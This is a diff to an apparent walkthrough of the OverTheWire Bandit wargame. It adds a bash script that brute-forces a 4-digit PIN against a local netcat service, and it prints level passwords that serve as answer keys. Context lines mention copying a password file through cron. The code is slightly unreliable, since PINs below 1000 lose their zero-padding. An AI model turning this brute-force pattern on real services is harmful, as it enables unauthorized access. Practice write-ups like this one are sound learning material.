@@ -96,3 +96,22 @@ code = etc/bandit_pass/bandit24 > tmp/"created directory"/"created file"  --> th
 We can check our password in that file after few seconds.
 
 password = `VAfGXJ1PBSsPSnvsjI8p759leLZ9GGar`
+
+## Level -24
+for this level we should write our own shell script code to submit all the possible numbers with the previous password.
+
+the code(we will write this code in tmp directory):
+`#!/bin/bash
+
+count=0000
+passwd="VAfGXJ1PBSsPSnvsjI8p759leLZ9GGar"
+
+while [ "$count" -le 10000 ]
+do
+    echo "$passwd $count"
+    count=$((count + 1))
+done | nc localhost 30002 > test  #it is the file where the password goes`
+
+then - cat test | grep password.
+
+password = 'p7TaowMYrmu23Ol8hiZh9UvD0O9hpx8d'
